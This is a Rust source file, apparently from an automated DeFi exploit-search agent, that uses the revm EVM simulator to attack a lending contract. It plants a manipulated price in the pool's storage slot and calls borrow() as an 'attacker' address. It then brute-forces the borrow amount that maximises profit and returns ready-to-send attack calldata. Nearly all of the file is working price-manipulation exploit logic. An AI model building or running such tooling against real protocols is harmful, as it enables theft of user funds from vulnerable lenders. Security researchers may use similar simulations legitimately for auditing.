use alloy_primitives::{Address, Bytes, U256};
use alloy_sol_types::{sol, SolCall};
use revm::Database;
use revm::db::{CacheDB, EmptyDB};
use revm::primitives::{AccountInfo, TransactTo, SpecId};
use revm::Evm;
use tracing::info;
use crate::agents::heimdall_analyzer::ContractAnalysis;

sol! {
    function borrow(uint256 amount, address pool) external;
}

pub fn mapping_slot(user: Address, base_slot: U256) -> U256 {
    let mut preimage = [0u8; 64];
    preimage[12..32].copy_from_slice(user.as_ref());
    preimage[32..64].copy_from_slice(&base_slot.to_be_bytes::<32>());
    let key = alloy_primitives::keccak256(preimage);
    U256::from_be_bytes(key.0)
}

/// Heimdall‑aware ROR detection.
/// If analysis is provided, we look for a price variable in the storage layout
/// and use its slot. Otherwise we fall back to slot 0.
pub fn find_optimal_borrow_heimdall(
    db: &mut CacheDB<EmptyDB>,
    lender_addr: Address,
    pool_addr: Address,
    attacker: Address,
    dirty_price: U256,
    analysis: Option<&ContractAnalysis>,
) -> (U256, Bytes) {
    // Determine the price slot from heimdall analysis (or default 0)
    let price_slot = analysis
        .and_then(|a| {
            a.storage_slots.iter()
                .find(|(_, name)| name.contains("price") || name.contains("Price") || name.contains("virtualPrice"))
                .map(|(slot_num, _)| U256::from(*slot_num))
        })
        .unwrap_or(U256::from(0));

    info!("🧠 ROR using price slot: {}", price_slot);
    find_optimal_borrow_core(db, lender_addr, pool_addr, attacker, dirty_price, price_slot)
}

/// Core ROR detection (unchanged from before, but accepts price_slot)
pub fn find_optimal_borrow_core(
    db: &mut CacheDB<EmptyDB>,
    lender_addr: Address,
    pool_addr: Address,
    attacker: Address,
    dirty_price: U256,
    price_slot: U256,
) -> (U256, Bytes) {
    let scale = U256::from(10).pow(U256::from(18));
    let coll_slot = mapping_slot(attacker, U256::from(0));
    let collateral = db.storage(lender_addr, coll_slot).unwrap_or(U256::ZERO);

    // The maximum borrowable amount at the manipulated price
    let max_allowed = (collateral * dirty_price) / scale;
    if max_allowed > U256::ZERO {
        let amount = max_allowed;
        let calldata = borrowCall::new((amount, pool_addr)).abi_encode();

        let mut try_db = db.clone();
        try_db.insert_account_storage(pool_addr, price_slot, dirty_price).unwrap();
        {
            let mut evm = Evm::builder()
                .with_db(&mut try_db)
                .with_spec_id(SpecId::LATEST)
                .build();
            *evm.tx_mut() = revm::primitives::TxEnv {
                caller: attacker,
                transact_to: TransactTo::Call(lender_addr),
                data: Bytes::from(calldata.clone()),
                value: U256::ZERO,
                ..Default::default()
            };
            evm.transact_commit().ok();
        }
        try_db.insert_account_storage(pool_addr, price_slot, U256::from(1_000_000_000_000_000_000u128)).unwrap();
        let loan_slot = mapping_slot(attacker, U256::from(1));
        let loan = try_db.storage(lender_addr, loan_slot).unwrap_or(U256::ZERO);
        let safe = (collateral * U256::from(1_000_000_000_000_000_000u128)) / scale;
        if loan > safe {
            info!("🧠 Optimal borrow: {} (profit: {})", amount, loan - safe);
            return (amount, Bytes::from(calldata));
        }
    }

    // Fallback brute‑force (rarely needed)
    let max_possible = (collateral * dirty_price) / scale;
    let step = max_possible / U256::from(20);
    let mut best_profit = U256::ZERO;
    let mut best_amount = U256::ZERO;
    let mut best_calldata = Bytes::default();
    let loan_slot = mapping_slot(attacker, U256::from(1));
    let mut amount = step;
    while amount <= max_possible {
        let mut try_db = db.clone();
        try_db.insert_account_storage(pool_addr, price_slot, dirty_price).unwrap();
        let calldata = borrowCall::new((amount, pool_addr)).abi_encode();
        {
            let mut evm = Evm::builder()
                .with_db(&mut try_db)
                .with_spec_id(SpecId::LATEST)
                .build();
            *evm.tx_mut() = revm::primitives::TxEnv {
                caller: attacker,
                transact_to: TransactTo::Call(lender_addr),
                data: Bytes::from(calldata.clone()),
                value: U256::ZERO,
                ..Default::default()
            };
            let _ = evm.transact_commit();
        }
        try_db.insert_account_storage(pool_addr, price_slot, U256::from(1_000_000_000_000_000_000u128)).unwrap();
        let loan_recorded = try_db.storage(lender_addr, loan_slot).unwrap_or(U256::ZERO);
        let safe_max = (collateral * U256::from(1_000_000_000_000_000_000u128)) / scale;
        if loan_recorded > safe_max {
            let profit = loan_recorded - safe_max;
            if profit > best_profit {
                best_profit = profit;
                best_amount = amount;
                best_calldata = Bytes::from(calldata);
            }
        }
        amount += step;
    }
    info!("✅ Brute-force optimal borrow: amount={}, profit={}", best_amount, best_profit);
    (best_amount, best_calldata)
}